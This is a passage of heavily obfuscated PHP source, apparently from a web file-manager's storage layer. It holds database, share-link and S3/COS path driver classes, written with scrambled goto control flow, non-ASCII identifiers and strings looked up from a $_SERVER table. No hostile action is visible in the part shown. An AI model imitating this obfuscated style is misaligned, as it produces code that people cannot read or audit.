$B­œµøÈ¶÷)); } goto a…é‡Æ­; c«İ‚¥¼¬: $bâˆòâĞÚ¾ = Model($EèøÊÕàÒ[2159])->where($D¡¿ÙÃÕ’È)->count(); $B­œµøÈ¶÷ = intval($CÛÂáÜ„Ã) + intval($bâˆòâĞÚ¾); if ($B­œµøÈ¶÷ == 0) { IO::remove($cä©–ˆòÒï[$EèøÊÕàÒ[85]]); $this->where($D¡¿ÙÃÕ’È)->delete(); $this->metaSet($cä©–ˆòÒï[$EèøÊÕàÒ[431]], null, null); return; } goto b°„Í·‚äù; a…é‡Æ­: } public function storageInfo($D‰‹Èˆê = false) { goto bî åÁŠ‡™; E±Š¡—©ÖÑ: for ($CÕƒŠ¨çÊ = 0; $CÕƒŠ¨çÊ < $cî‚ÂÜÕªÓ; $CÕƒŠ¨çÊ = $CÕƒŠ¨çÊ + $bè°êÛˆ¿½) { $E¾¸‹óÊ = $this->limit($CÕƒŠ¨çÊ, $CÕƒŠ¨çÊ + $bè°êÛˆ¿½)->select(); foreach ($E¾¸‹óÊ as $d†³¹´Ù¸Ë) { $E¹»…†±ªò += $d†³¹´Ù¸Ë[$bã›õÖ–´[87]] * $d†³¹´Ù¸Ë[$bã›õÖ–´[2155]]; $A¹»è ¡øÙ += $d†³¹´Ù¸Ë[$bã›õÖ–´[87]] * ($d†³¹´Ù¸Ë[$bã›õÖ–´[2155]] - 1); $e™ğøä‡²Ï += $d†³¹´Ù¸Ë[$bã›õÖ–´[2155]]; } } $eãñ•õĞì© = array($bã›õÖ–´[2160] => $E¹»…†±ªò, $bã›õÖ–´[2161] => $A¹»è ¡øÙ, $bã›õÖ–´[2162] => $A¹»è ¡øÙ / $E¹»…†±ªò, $bã›õÖ–´[91] => $cî‚ÂÜÕªÓ, $bã›õÖ–´[2163] => $e™ğøä‡²Ï); return $eãñ•õĞì©; goto c¯ÂÛğœ¥õ; bî åÁŠ‡™: $bã›õÖ–´ =& $_SERVER[¨¤¼…´]; $cî‚ÂÜÕªÓ = $this->count() + 0.0; $A¹»è ¡øÙ = 0; goto d³‡®¨ˆğ; d³‡®¨ˆğ: $E¹»…†±ªò = 1; $e™ğøä‡²Ï = 0; $bè°êÛˆ¿½ = 5000; goto E±Š¡—©ÖÑ; c¯ÂÛğœ¥õ: } } goto c‡¦¿ØßœÍ; fÂšªáÊ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($b¼Í°–§Î…) { $this->pathParse = $b¼Í°–§Î…; $this->model = Model($_SERVER[¨¤¼…´][1107]); } protected function infoParse($EäØ–ˆñ†â, $B°Ø†Ò§¶¬ = false, $e™Èß«¬è… = false) { $D…ùº µÜø =& $_SERVER[¨¤¼…´]; return Action($D…ùº µÜø[1009])->sharePathInfo($this->pathParse[$D…ùº µÜø[85]], !0); } public function listPath($a‡‰¤ªº£ñ, $bµßÇø“› = false) { $F†‘î¤£¤ =& $_SERVER[¨¤¼…´]; $fùŠ¿äİïŠ = parent::listPath($a‡‰¤ªº£ñ, $bµßÇø“›); foreach ($fùŠ¿äİïŠ as $b¶¹Ã¯ÚŠ => $f‹¥‡Ïµ) { if (!in_array($b¶¹Ã¯ÚŠ, array($F†‘î¤£¤[83], $F†‘î¤£¤[84]))) { continue; } foreach ($f‹¥‡Ïµ as $aø¾µ¹«¬ï => $D÷ˆğ”ôÏ) { $fùŠ¿äİïŠ[$b¶¹Ã¯ÚŠ][$aø¾µ¹«¬ï] = Action($F†‘î¤£¤[1009])->shareItemInfo($D÷ˆğ”ôÏ); } } return $fùŠ¿äİïŠ; } public function listAll($B¸—Ì°Ú³µ) { goto B±†è®ÆÑà; DŒ•¬ ÇÏ¾: return $bñ›áôß¿; goto CéòİæßÛç; b¹¦‰«ÛšÜ: $bñ›áôß¿ = $this->model->listAll($B¸—Ì°Ú³µ); foreach ($bñ›áôß¿ as &$E°„ïñááÃ) { $E°„ïñááÃ[$dÏ³ŞÕ¾[403]] = Action($dÏ³ŞÕ¾[1009])->shareItemInfo($E°„ïñááÃ[$dÏ³ŞÕ¾[403]]); } unset($E°„ïñááÃ); goto DŒ•¬ ÇÏ¾; B±†è®ÆÑà: $dÏ³ŞÕ¾ =& $_SERVER[¨¤¼…´]; $dö¸Œ½Çˆ³ = IO::info($this->pathParse[$dÏ³ŞÕ¾[85]]); if (!$dö¸Œ½Çˆ³) { return array(); } goto b¹¦‰«ÛšÜ; CéòİæßÛç: } } class PathDriverDriverShareItem { public function __construct($Cí¨™‚Ü°¾) { $this->pathParse = $Cí¨™‚Ü°¾; } public function __call($fŸ™‚¿Ì¯, $D­²ÉãÙ¾) { $dÄ—æËöİ˜ =& $_SERVER[¨¤¼…´]; if (method_exists($this, $fŸ™‚¿Ì¯)) { return; } $F‘í§ˆçË£ = call_user_func_array(array($dÄ—æËöİ˜[1115], $fŸ™‚¿Ì¯), $D­²ÉãÙ¾); $f«ÓĞÁ‚ğ = array($dÄ—æËöİ˜[1116], $dÄ—æËöİ˜[1117], $dÄ—æËöİ˜[1118], $dÄ—æËöİ˜[1119], $dÄ—æËöİ˜[503], $dÄ—æËöİ˜[505], $dÄ—æËöİ˜[1120], $dÄ—æËöİ˜[113], $dÄ—æËöİ˜[1121], $dÄ—æËöİ˜[1122]); if (in_array($fŸ™‚¿Ì¯, $f«ÓĞÁ‚ğ)) { $F‘í§ˆçË£ = $this->getPathOuter($F‘í§ˆçË£); } return $F‘í§ˆçË£; } public function copy($EÏ‰Ó¾æ‘Õ, $F©øÇÍ½Ù´, $AÊº¹Ò§ë™ = false) { return $this->copyMove($EÏ‰Ó¾æ‘Õ, $F©øÇÍ½Ù´, $AÊº¹Ò§ë™, $_SERVER[¨¤¼…´][503]); } public function move($C¹Ã¾­¤ôë, $c‰íÙ©»øÆ, $Aù÷íÄÛ½¹ = false) { return $this->copyMove($C¹Ã¾­¤ôë, $c‰íÙ©»øÆ, $Aù÷íÄÛ½¹, $_SERVER[¨¤¼…´][505]); } private function copyMove($e–Î¦‡…ê¢, $däŒÑ¡½‡Ï, $D‰Ù…èƒâ´, $CØåğš¿Ç—) { goto fÄ¬ß£ÎĞ¸; AË£ÄÒ¬ó„: if ($dåÂ÷¤…—©->pathParse[$aêˆ‘ÓŠèÁ[985]]) { $däŒÑ¡½‡Ï = $dåÂ÷¤…—©->pathParse[$aêˆ‘ÓŠèÁ[985]]; } else { $däŒÑ¡½‡Ï = $e¾œÛÅòùÁ; } $d¼Ğë£¸çÕ = IO::copyMove($e–Î¦‡…ê¢, $däŒÑ¡½‡Ï, $D‰Ù…èƒâ´, $CØåğš¿Ç—); $d¼Ğë£¸çÕ = $this->getPathOuter($d¼Ğë£¸çÕ); goto f÷è˜ŸÅ‡ê; f÷è˜ŸÅ‡ê: return $d¼Ğë£¸çÕ; goto eÆÌ™»‚¢; fÄ¬ß£ÎĞ¸: $aêˆ‘ÓŠèÁ =& $_SERVER[¨¤¼…´]; $e¾œÛÅòùÁ = $däŒÑ¡½‡Ï; $dåÂ÷¤…—© = IO::driverMake($däŒÑ¡½‡Ï); goto AË£ÄÒ¬ó„; eÆÌ™»‚¢: } public function pathFather($D–ˆòÍ†ƒ£) { return get_path_father($this->pathParse[$_SERVER[¨¤¼…´][85]]); } public function iconvSystem($F¥ùº—‹ƒë) { return $F¥ùº—‹ƒë; } protected function infoParse($cŒÀ¬”¡ù, $AˆÑñÄ¬ = false) { $dÍòŞ³Ù‚Û =& $_SERVER[¨¤¼…´]; $F½ƒÇËËÊ = $this->pathParse[$dÍòŞ³Ù‚Û[450]][$dÍòŞ³Ù‚Û[1010]] . $this->pathParse[$dÍòŞ³Ù‚Û[1003]]; if ($AˆÑñÄ¬) { $a±Ú¬ÚŠ = IO::infoWithChildren($F½ƒÇËËÊ); } else { $a±Ú¬ÚŠ = IO::info($F½ƒÇËËÊ); } $aŒ‹É‚à¬ƒ = $this->pathParse[$dÍòŞ³Ù‚Û[450]]; return Action($dÍòŞ³Ù‚Û[1114])->_shareItemeParse($a±Ú¬ÚŠ, $aŒ‹É‚à¬ƒ); } public function listAll($D˜‹Ï™Áê) { $c»ö‚µè…½ =& $_SERVER[¨¤¼…´]; $Dœ´ŸÀëã™ = IO::listAll($D˜‹Ï™Áê); $Cç´‹Œ¤ğİ = $this->pathParse[$c»ö‚µè…½[450]]; foreach ($Dœ´ŸÀëã™ as &$E†ˆîçî—„) { check_abort(); $E†ˆîçî—„ = array_merge(IO::info($E†ˆîçî—„[$c»ö‚µè…½[85]]), $E†ˆîçî—„); $E†ˆîçî—„[$c»ö‚µè…½[403]] = Action($c»ö‚µè…½[1114])->_shareItemeParse($E†ˆîçî—„, $Cç´‹Œ¤ğİ); } unset($E†ˆîçî—„); return $Dœ´ŸÀëã™; } public function getPathOuter($eÖ†ïİù³¿) { goto c¾¾¬§¨; B¡Ê–ãªš: $cÇ¼ÚËê®Û = KodIO::clear($eÖ†ïİù³¿); $b½§·éØÒ£ = KodIO::clear($this->pathParse[$AÛ½„¶í©á[450]][$AÛ½„¶í©á[1010]]); $CÄ¦ ÈãµË = substr($cÇ¼ÚËê®Û, strlen($b½§·éØÒ£)); goto fäøÍŸÂÒ; c¾¾¬§¨: $AÛ½„¶í©á =& $_SERVER[¨¤¼…´]; $fŠõÛÓñßì = KodIO::parse($eÖ†ïİù³¿); if ($fŠõÛÓñßì[$AÛ½„¶í©á[39]] == KodIO::KOD_SHARE_ITEM) { return $fŠõÛÓñßì[$AÛ½„¶í©á[85]]; } goto B¡Ê–ãªš; fäøÍŸÂÒ: if (substr($cÇ¼ÚËê®Û, 0, strlen($b½§·éØÒ£)) != $b½§·éØÒ£) { return !1; } return $this->pathParse[$AÛ½„¶í©á[1004]] . $AÛ½„¶í©á[8] . ltrim($CÄ¦ ÈãµË, $AÛ½„¶í©á[8]); goto e¡è®Ìˆ®˜; e¡è®Ìˆ®˜: } public function getType() { $d Ø¯ÆË‚” =& $_SERVER[¨¤¼…´]; $aİºÃğãÚ = str_replace($d Ø¯ÆË‚”[81], $d Ø¯ÆË‚”[43], get_class($this)); return strtolower($aİºÃğãÚ); } public function isTypeObject($B·õ³»¾–Ö) { return IO::isTypeObject($B·õ³»¾–Ö); } public function info($c¨²¤ÕîÕÊ) { return $this->infoParse($c¨²¤ÕîÕÊ); } public function infoAuth($E±•¥•èÅ¡) { return $this->infoParse($E±•¥•èÅ¡); } public function infoWithChildren($aŒº³¥Öå) { return $this->infoParse($aŒº³¥Öå, !0); } public function infoFull($d¼ ‚â’‡) { return $this->infoParse($d¼ ‚â’‡); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($FâçÙß¸è†) { $this->pathParse = $FâçÙß¸è†; } protected function infoParse($Cäå³›Ä‰Æ, $aøĞ·ĞöÆÚ = false) { $EŒÄİæÅ²Ä =& $_SERVER[¨¤¼…´]; return Action($EŒÄİæÅ²Ä[1009])->sharePathInfo($this->pathParse[$EŒÄİæÅ²Ä[85]], !0, $aøĞ·ĞöÆÚ); } public function listPath($Fš”§ºÆÁ, $A¥›îÑÂùì = false) { $Fæ­éËŸí =& $_SERVER[¨¤¼…´]; $c¾êä¥Ğ™ = IO::listPath($Fš”§ºÆÁ, $A¥›îÑÂùì); foreach ($c¾êä¥Ğ™ as $fÅÄé§²ö => $A®ˆ—Š¿´) { if (!in_array($fÅÄé§²ö, array($Fæ­éËŸí[83], $Fæ­éËŸí[84]))) { continue; } foreach ($A®ˆ—Š¿´ as $C”»”²çÌŞ => $fœ¹½š‰ãÕ) { $fœ¹½š‰ãÕ = Action($Fæ­éËŸí[1123])->parsePathChildren($fœ¹½š‰ãÕ, array($Fæ­éËŸí[399] => $Fš”§ºÆÁ)); $c¾êä¥Ğ™[$fÅÄé§²ö][$C”»”²çÌŞ] = Action($Fæ­éËŸí[1009])->shareItemInfo($fœ¹½š‰ãÕ); } } return $c¾êä¥Ğ™; } public function listAll($Aà¢ŠÏ™èÜ) { $bÀõµº–ª¸ =& $_SERVER[¨¤¼…´]; $e·ë‡áÔ‚Ë = IO::listAll($Aà¢ŠÏ™èÜ); foreach ($e·ë‡áÔ‚Ë as &$eà†¿²Ãìö) { $eà†¿²Ãìö = array_merge(IO::info($eà†¿²Ãìö[$bÀõµº–ª¸[85]]), $eà†¿²Ãìö); $eà†¿²Ãìö[$bÀõµº–ª¸[403]] = Action($bÀõµº–ª¸[1009])->shareItemInfo($eà†¿²Ãìö); } unset($eà†¿²Ãìö); return $e·ë‡áÔ‚Ë; } } goto d³¶¥øÔ‹; cò±•—Û•: function beforeShutdown() { Hook::trigger($_SERVER[ë‹ºñÌ†‡][32]); } $_SERVER[$_SERVER[ë‹ºñÌ†‡][33]] = BASIC_PATH; $_SERVER[$_SERVER[ë‹ºñÌ†‡][34]] = LIB_DIR; goto CÈÃÌ‚°”Ô; A¸Ï„ƒ‡ƒ¹: define($_SERVER[¨¤¼…´][239], 1); define($_SERVER[¨¤¼…´][240], 2); define($_SERVER[¨¤¼…´][241], 3); goto a¤Ã¿ÚÚß; B™Ä¡÷íÄ: function beforeShutdownFatalError($A…Â´³™’š) { think_exception($A…Â´³™’š); } $_SERVER[$_SERVER[ë‹ºñÌ†‡][45]] = $eˆ‚â¹™„Æ($_SERVER[$_SERVER[ë‹ºñÌ†‡][42]]); $aÖ‘ÛÄ†’ñ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto cøõÓƒŒÀ; dæœó†¶Î‰: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($a·ŸÛÃìì) { parent::__construct($a·ŸÛÃìì); $this->signatureVersion($_SERVER[¨¤¼…´][214]); } public function uploadFormData($eÁõæ‚ƒ£—, $cŞãä”£³ = 3600) { goto BÇìÀ‚Ö‹š; c£‰ŸõÆá: $FÀÔÒÛçÙ½ = sha1($dîÒîáåô«); $BĞ†Üá‚Ä = hash_hmac($AíÓÏåß‘Û[231], $FÀÔÒÛçÙ½, $a³“Ñæ•Æœ); $eË‚ª›´¨¡ = array($AíÓÏåß‘Û[1094] => $fæÛÛÎßÊ¿, $AíÓÏåß‘Û[1098] => $EËí…ùÁßò, $AíÓÏåß‘Û[1102] => base64_encode($dîÒîáåô«), $AíÓÏåß‘Û[1099] => $AíèÃÖ¶Ÿê, $AíÓÏåß‘Û[1100] => $this->accessKey, $AíÓÏåß‘Û[1103] => $e ™Ôœò¯î, $AíÓÏåß‘Û[1104] => $BĞ†Üá‚Ä, $AíÓÏåß‘Û[183] => $this->getHost()); goto Aç›‚À°Œ«; eŞ‚»¼Ò²±: $dîÒîáåô« = array($AíÓÏåß‘Û[1092] => $EĞ’Æ‘Õá¥, $AíÓÏåß‘Û[1093] => array(array($AíÓÏåß‘Û[1094] => $fæÛÛÎßÊ¿), array($AíÓÏåß‘Û[1095] => $this->bucket), array($AíÓÏåß‘Û[1096], $AíÓÏåß‘Û[1097], $AíÓÏåß‘Û[43]), array($AíÓÏåß‘Û[1098] => $EËí…ùÁßò), array($AíÓÏåß‘Û[1099] => $AíèÃÖ¶Ÿê), array($AíÓÏåß‘Û[1100] => $this->accessKey), array($AíÓÏåß‘Û[1101] => $e ™Ôœò¯î))); $dîÒîáåô« = json_encode($dîÒîáåô«); $a³“Ñæ•Æœ = hash_hmac($AíÓÏåß‘Û[231], $e ™Ôœò¯î, $this->secret); goto c£‰ŸõÆá; c†ø¿ÔÀì: $EËí…ùÁßò = $AíÓÏåß‘Û[1090]; $EĞ’Æ‘Õá¥ = gmdate($AíÓÏåß‘Û[1091], time() + $cŞãä”£³); $e ™Ôœò¯î = (string) time() . $AíÓÏåß‘Û[77] . (string) (time() + $cŞãä”£³); goto eŞ‚»¼Ò²±; Aç›‚À°Œ«: return $eË‚ª›´¨¡; goto A°Æóßôö–; BÇìÀ‚Ö‹š: $AíÓÏåß‘Û =& $_SERVER[¨¤¼…´]; $fæÛÛÎßÊ¿ = $AíÓÏåß‘Û[199]; $AíèÃÖ¶Ÿê = $AíÓÏåß‘Û[231]; goto c†ø¿ÔÀì; A°Æóßôö–: } public function fileOutLink($A†–Ö©“Î—) { $DÖ×å«µ‘å =& $_SERVER[¨¤¼…´]; if (substr($A†–Ö©“Î—, 0, 7) == $DÖ×å«µ‘å[1105]) { $A†–Ö©“Î— = $DÖ×å«µ‘å[1106] . substr($A†–Ö©“Î—, 7); } header($DÖ×å«µ‘å[166] . $A†–Ö©“Î—); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($e¨êí“±¦®) { $this->pathParse = $e¨êí“±¦®; $this->model = Model($_SERVER[¨¤¼…´][1107]); } public function getPath($DßØøÅç÷š) { return trim($DßØøÅç÷š, $_SERVER[¨¤¼…´][8]); } public function pathFather($e¨™ƒÌ¹ŠÒ) { $DÊñ›ó¨ï¦ = $this->parse($e¨™ƒÌ¹ŠÒ); $DÊñ›ó¨ï¦ = $this->infoSimple($e¨™ƒÌ¹ŠÒ); return $DÊñ›ó¨ï¦ ? $DÊñ›ó¨ï¦[$_SERVER[¨¤¼…´][474]] : !1; } public function getPathName($b‡­Œ®¸˜ì) { $E‚‹×’¦º  = $this->infoSimple($b‡­Œ®¸˜ì); return $E‚‹×’¦º  ? $E‚‹×’¦º [$_SERVER[¨¤¼…´][38]] : !1; } public function getPathOuter($bº÷Ô´…) { if (!$bº÷Ô´…) { return $bº÷Ô´…; } $e§ô©£á¹ = $this->parse($bº÷Ô´…); return KodIO::make($e§ô©£á¹[$_SERVER[¨¤¼…´][379]]); } public function copyFolderFromIO($Eö‚ù™¡®Œ, $aÊ²àÓ, $dÚ­Ï¡§¾ñ, $E‰”åó­, $fâ¦˜ÅŠîæ) { $c¿Á¥ì˜¹Ì = $this->model->copyFolderFromIO($Eö‚ù™¡®Œ, $aÊ²àÓ, $dÚ­Ï¡§¾ñ, $E‰”åó­, $fâ¦˜ÅŠîæ); return KodIO::make($c¿Á¥ì˜¹Ì); } public function isParentOf($aà£·¼¾ÃŞ, $B§ïåÛØë£) { return $this->model->isParentOf($aà£·¼¾ÃŞ, $B§ïåÛØë£); } public function mkfile($F£â‡“‡², $c‚”å¶àÛ = '', $e…„Š±¹Î¶ = REPEAT_RENAME) { $A¹Šô—Ğíˆ =& $_SERVER[¨¤¼…´]; $Eõîó·®à… = $this->parse($F£â‡“‡²); $F£â‡“‡² = $Eõîó·®à…[$A¹Šô—Ğíˆ[379]]; for ($D±¡ĞÖáŠÁ = 0; $D±¡ĞÖáŠÁ < count($Eõîó·®à…[$A¹Šô—Ğíˆ[1108]]); $D±¡ĞÖáŠÁ++) { $BÂ½¤‹¯ëç = $Eõîó·®à…[$A¹Šô—Ğíˆ[1108]][$D±¡ĞÖáŠÁ]; if ($D±¡ĞÖáŠÁ == count($Eõîó·®à…[$A¹Šô—Ğíˆ[1108]]) - 1) { $F£â‡“‡² = $this->model->mkfile($F£â‡“‡², $BÂ½¤‹¯ëç, $c‚”å¶àÛ, $e…„Š±¹Î¶); break; } $F£â‡“‡² = $this->model->mkdir($F£â‡“‡², $BÂ½¤‹¯ëç, REPEAT_SKIP); } return $this->getPathOuter($F£â‡“‡²); } public function mkdir($fÈƒÏÁÕî¾, $a§µê‘¿Ù— = REPEAT_SKIP) { $e¦´áÉ¢Ë =& $_SERVER[¨¤¼…´]; $E’ËàŞÅ§Å = $this->parse($fÈƒÏÁÕî¾); $fÈƒÏÁÕî¾ = $E’ËàŞÅ§Å[$e¦´áÉ¢Ë[379]]; for ($d¹ÙÔë¬”‹ = 0; $d¹ÙÔë¬”‹ < count($E’ËàŞÅ§Å[$e¦´áÉ¢Ë[1108]]); $d¹ÙÔë¬”‹++) { $b‰ŞØ–Û”Ç = $E’ËàŞÅ§Å[$e¦´áÉ¢Ë[1108]][$d¹ÙÔë¬”‹]; $fÈƒÏÁÕî¾ = $this->model->mkdir($fÈƒÏÁÕî¾, $b‰ŞØ–Û”Ç, $a§µê‘¿Ù—); } return $this->getPathOuter($fÈƒÏÁÕî¾); } public function copyFile($F¿Èæ¹˜„, $cİÔ”àğœò, $Eíè‚ïğ  = REPEAT_REPLACE) { $B–À­¿Œœ =& $_SERVER[¨¤¼…´]; $EÊÊÛÛ»’ø = $this->parse($cİÔ”àğœò); $F°à¨¼õ¶– = $this->model->copy($F¿Èæ¹˜„, $EÊÊÛÛ»’ø[$B–À­¿Œœ[379]], $Eíè‚ïğ , $EÊÊÛÛ»’ø[$B–À­¿Œœ[85]]); return $F°à¨¼õ¶– ? $this->getPathOuter($F°à¨¼õ¶–) : !1; } public function moveFile($C‰İ³ê•Ş, $dŠ·Œ‹ŠÇ, $F‘‘±¸ª’Ô = REPEAT_REPLACE) { $bÇêäš†ˆ =& $_SERVER[¨¤¼…´]; $c¤“‚õ­›Î = $this->parse($dŠ·Œ‹ŠÇ); $C‡Ï‚ïĞ = $this->model->move($C‰İ³ê•Ş, $c¤“‚õ­›Î[$bÇêäš†ˆ[379]], $F‘‘±¸ª’Ô, $c¤“‚õ­›Î[$bÇêäš†ˆ[85]]); return $C‡Ï‚ïĞ ? $this->getPathOuter($C‡Ï‚ïĞ) : !1; } public function copy($Bâº²¢•…, $Cææˆ¥ˆŠµ, $aÉ´¦ÅØÅ” = REPEAT_REPLACE) { $A”£¿Ôßà = $this->parse($Cææˆ¥ˆŠµ); $C„œ¤Ú‚èÂ = $this->model->copy($Bâº²¢•…, $A”£¿Ôßà[$_SERVER[¨¤¼…´][379]], $aÉ´¦ÅØÅ”); return $C„œ¤Ú‚èÂ ? $this->getPathOuter($C„œ¤Ú‚èÂ) : !1; } public function moveSameAllow() { } public function move($A˜ªªËÂ÷³, $C²ÜÒ¾Ù½Ñ, $Aˆ‡¤Ü¤ã¥ = REPEAT_REPLACE) { $FôùàÃ®Üï = $this->parse($C²ÜÒ¾Ù½Ñ); $Bóİ°ÚÇ¸ò = $this->model->move($A˜ªªËÂ÷³, $FôùàÃ®Üï[$_SERVER[¨¤¼…´][379]], $Aˆ‡¤Ü¤ã¥); return $Bóİ°ÚÇ¸ò ? $this->getPathOuter($Bóİ°ÚÇ¸ò) : !1; } public function remove($bİâ°±°ÀÒ, $Còé´³™íÛ = true) { return $this->model->remove($bİâ°±°ÀÒ, $Còé´³™íÛ); } public function rename($c¼íÊ¦‹ÛÇ, $D¬Ë‡éİ½) { $E¿Ã÷±‹ÌÕ = $this->model->rename($c¼íÊ¦‹ÛÇ, $D¬Ë‡éİ½); return $E¿Ã÷±‹ÌÕ ? $this->getPathOuter($c¼íÊ¦‹ÛÇ) : $E¿Ã÷±‹ÌÕ; } public function size($e«ì¶ª­„) { $D‡î¶ÄÛá‰ = $this->infoSimple($e«ì¶ª­„); return $D‡î¶ÄÛá‰ ? $D‡î¶ÄÛá‰[$_SERVER[¨¤¼…´][87]] : 0; } public function infoSimple($AğˆÙÑÊ¤) { return $this->model->sourceInfo($AğˆÙÑÊ¤); } public function info($Dâäˆ°Ë›‡) { return $this->infoParse($Dâäˆ°Ë›‡); } public function infoAuth($eæÃöÑ•Íù) { return $this->infoParse($eæÃöÑ•Íù, !1, !0); } public function infoWithChildren($e ¾ ˆì›¶) { return $this->infoParse($e ¾ ˆì›¶, !0); } protected function infoParse($fßÜâ¼¿Ü—, $cÉÌ¢×–¥Ì = false, $C…Àò‘„îµ = false) { if (!$cÉÌ¢×–¥Ì) { return $this->model->pathInfo($fßÜâ¼¿Ü—, $C…Àò‘„îµ); } return $this->model->pathInfoMore($fßÜâ¼¿Ü—); } public function infoFull($fóœ§©‘Ô) { $C¨éÒÏ¢‰… =& $_SERVER[¨¤¼…´]; $BÓŠƒÚ³ïÜ = explode($C¨éÒÏ¢‰…[8], $fóœ§©‘Ô); $Bâ±õƒŞˆô = implode($C¨éÒÏ¢‰…[8], array_splice($BÓŠƒÚ³ïÜ, 1)); return $this->model->pathInfoByPath($BÓŠƒÚ³ïÜ[0], $Bâ±õƒŞˆô); } public function hashSimple($d¨„†Â»ÊÏ) { $d·É„õˆîÛ =& $_SERVER[¨¤¼…´]; $Eò•¬¨¡ˆÈ = $this->infoWithChildren($d¨„†Â»ÊÏ); return $Eò•¬¨¡ˆÈ[$d·É„õˆîÛ[171]][$d·É„õˆîÛ[178]]; } public function hashMd5($fØÕŞ¶ÍÉ) { $FŸÔÅ¯Æ‚õ =& $_SERVER[¨¤¼…´]; $aï³¥œ”¢Ï = $this->infoWithChildren($fØÕŞ¶ÍÉ); return $aï³¥œ”¢Ï[$FŸÔÅ¯Æ‚õ[171]][$FŸÔÅ¯Æ‚õ[177]]; } public function exist($bÙ¥‡‘íŠÊ) { $DïÏÆ‡”¼ =& $_SERVER[¨¤¼…´]; $cèİ˜Šß³Û = $this->parse($bÙ¥‡‘íŠÊ); if (!$cèİ˜Šß³Û[$DïÏÆ‡”¼[85]]) { return $this->isFile($bÙ¥‡‘íŠÊ) || $this->isFolder($bÙ¥‡‘íŠÊ); } $DÍ©Íİªª‡ = array($DïÏÆ‡”¼[380] => $cèİ˜Šß³Û[$DïÏÆ‡”¼[379]], $DïÏÆ‡”¼[38] => $cèİ˜Šß³Û[$DïÏÆ‡”¼[85]]); $e®Îô»¦¹÷ = $this->model->where($DÍ©Íİªª‡)->find(); return $e®Îô»¦¹÷ ? !0 : !1; } public function isFile($Bº ˆëÀ…˜) { $E„¤áõÈÜá =& $_SERVER[¨¤¼…´]; $dŠ¬¼Çõö‡ = $this->infoSimple($Bº ˆëÀ…˜); return $dŠ¬¼Çõö‡ && $dŠ¬¼Çõö‡[$E„¤áõÈÜá[382]] == $E„¤áõÈÜá[93] ? !1 : !0; } public function isFolder($Bìñ¨Ì±ç) { $eÇ¹‘‹Î º =& $_SERVER[¨¤¼…´]; $aã¢óî£¸ = $this->infoSimple($Bìñ¨Ì±ç); return $aã¢óî£¸ && $aã¢óî£¸[$eÇ¹‘‹Î º[382]] == $eÇ¹‘‹Î º[93] ? !0 : !1; } public function listPath($BÇå»ß’…, $D˜ğ™±¼­ = false) { $eĞ®ğ¿ –¹ =& $_SERVER[¨¤¼…´]; if ($BÇå»ß’… == $eĞ®ğ¿ –¹[43]) { return !1; } $D²æ‹äâİ¨ = array($eĞ®ğ¿ –¹[380] => $BÇå»ß’…); if ($D˜ğ™±¼­) { return $this->model->listSource($D²æ‹äâİ¨, -1); } return $this->model->listSource($D²æ‹äâİ¨); } public function has($f³Øˆ‰´°Â, $d‡ÜØ±Ø† = false, $bÄ’Á™É™ = null) { $cá°àé« =& $_SERVER[¨¤¼…´]; $fØšÛ¤»µø = $this->infoWithChildren($f³Øˆ‰´°Â); if ($d‡ÜØ±Ø†) { return array($cá°àé«[206] => $fØšÛ¤»µø[$cá°àé«[206]], $cá°àé«[205] => $fØšÛ¤»µø[$cá°àé«[205]]); } return $bÄ’Á™É™ ? $fØšÛ¤»µø[$cá°àé«[206]] : $fØšÛ¤»µø[$cá°àé«[205]]; } public function listAll($D¥´ÓÍá¸) { $EÊ»èÆøŠê = IO::info($this->pathParse[$_SERVER[¨¤¼…´][85]]); if (!$EÊ»èÆøŠê) { return array(); } return $this->model->listAll($D¥´ÓÍá¸); } public function getContent($f‘»¥”‚‡Î) { return $this->model->getContent($f‘»¥”‚‡Î); } public function setContent($eŸÂ¶Âƒˆ…, $cß£ºâ®„ï = '') { return $this->model->setContent($eŸÂ¶Âƒˆ…, $cß£ºâ®„ï); } public function fileSubstr($a¶º‚æ§ºİ, $AË‡’İöñ, $F°ŸŒğ›×ê) { return $this->model->fileSubstr($a¶º‚æ§ºİ, $AË‡’İöñ, $F°ŸŒğ›×ê); } public function download($bÕš¼³¿, $Eß×ÊµçÔˆ = '') { $fç£µ…ªˆÄ = get_path_father($Eß×ÊµçÔˆ); $bî‘­’˜ÔÔ = get_path_this($Eß×ÊµçÔˆ); $e´Œ¼í°Ø = $this->model->fileInfoGet($bÕš¼³¿); $AäàáŠõ‘ = IO::copy($e´Œ¼í°Ø[$_SERVER[¨¤¼…´][85]], $fç£µ…ªˆÄ, !1, $bî‘­’˜ÔÔ); return $AäàáŠõ‘; } public function setModifyTime($AÒÒÆ‡İ, $eµŒÙê®È = '') { $this->model->metaSet($AÒÒÆ‡İ, $_SERVER[¨¤¼…´][1109], $eµŒÙê®È); } public function upload($AõÑ©âôŞ, $C¯Ä¸ÄˆÚ©, $d÷£³²î„Î = false, $b¾õµÆ¬ÔÅ = REPEAT_REPLACE) { $c¿”Ú‡Âä =& $_SERVER[¨¤¼…´]; $aÀĞƒ™ê‰Í = $this->parse($AõÑ©âôŞ); $CŒÚ†„¸Ÿ¤ = $this->model->addFile($aÀĞƒ™ê‰Í[$c¿”Ú‡Âä[379]], $C¯Ä¸ÄˆÚ©, $aÀĞƒ™ê‰Í[$c¿”Ú‡Âä[85]], $d÷£³²î„Î, $b¾õµÆ¬ÔÅ); return $this->getPathOuter($CŒÚ†„¸Ÿ¤); } public function uploadFileByID($F³ãô¼•í–, $f®Ï¢Ø©î«, $a‹¸„åˆĞ) { $b²ãòÌâ÷ˆ =& $_SERVER[¨¤¼…´]; $BôÆ´ŸÊ× = $this->parse($F³ãô¼•í–); $a·µ¹‹¯£ª = $this->model->addFileByFileID($BôÆ´ŸÊ×[$b²ãòÌâ÷ˆ[379]], $f®Ï¢Ø©î«, $BôÆ´ŸÊ×[$b²ãòÌâ÷ˆ[85]], $a‹¸„åˆĞ); return $this->getPathOuter($a·µ¹‹¯£ª); } public function addFileByRemote($fÖÔßãù÷¢, $dÚ… ¢• Ş, $DÛŞÊğ–Ò = array(), $F®‰³ÔğÜß = '', $A‰âšßÀ÷ë) { $eÍİİ™áĞõ =& $_SERVER[¨¤¼…´]; $b¤‹î›ù ä = $this->parse($fÖÔßãù÷¢); $F®‰³ÔğÜß = empty($F®‰³ÔğÜß) ? $b¤‹î›ù ä[$eÍİİ™áĞõ[85]] : 